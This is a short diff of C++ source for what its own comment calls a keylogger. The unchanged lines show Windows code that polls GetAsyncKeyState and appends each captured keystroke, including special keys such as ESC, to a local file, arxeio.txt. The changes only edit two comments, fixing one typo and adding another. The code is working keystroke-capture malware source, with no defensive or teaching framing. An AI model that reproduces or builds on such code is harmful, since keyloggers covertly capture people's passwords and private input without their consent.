@@ -399,7 +399,7 @@ int main() {
 				arxeio << "~";
 			} else {
 				arxeio << "`";
-				return 0; //Dlete after debugging
+				return 0; //Delete after debugging
 			}
 		} else if (GetAsyncKeyState(0xBF) == -32767) {
 			if (GetAsyncKeyState(0x10)) {
@@ -440,7 +440,7 @@ int main() {
 		} else if (GetAsyncKeyState(0x1B) == -32767) {
 			arxeio << " \"ESC\" ";
 		} else {
-			//if there is no keystroke detected, the file will close (to save everything it has captured) and open again to capture the next letter. Because of this way i am inplementing the keylogger, the app will save the keystrokes, letter by letter.
+			//if there is no keystroke detected, the file will close (to save everything it has captured) and open again to prepapre capture the next letter. Because of this way i am inplementing the keylogger, the app will save the keystrokes, letter by letter.
 			arxeio.close();
 			arxeio.open("arxeio.txt", fstream::app);
 		}
